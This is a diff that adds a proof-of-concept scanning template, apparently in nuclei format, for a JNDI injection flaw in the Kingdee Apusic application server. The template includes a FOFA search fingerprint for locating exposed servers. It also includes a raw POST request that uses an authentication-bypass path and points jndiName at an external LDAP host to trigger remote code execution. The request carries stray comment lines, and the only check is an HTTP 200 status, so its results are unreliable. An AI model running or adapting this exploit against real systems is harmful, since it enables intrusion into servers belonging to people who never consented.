@@ -1,0 +1,42 @@
+id: poc-lenithu0gg9av88u
+info:
+  name: 金蝶Apusic应用服务器 createDataSource JNDI注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lenithu0gg9av88u'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lenithu0gg9av88u
+    fofa: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶") || header="EASSESSIONID" || banner="EASSESSIONID"
+http:
+- raw:
+  - 'POST /admin/;//protect/datasource/createDataSource HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    name=jndi1&jndiName=ldap://www.baidu.com&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=jndi&userName=jndi&password=jndi&repassword=jndi&connectionURL=jndi&driverClassName=java.lang.String&testCommand=
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
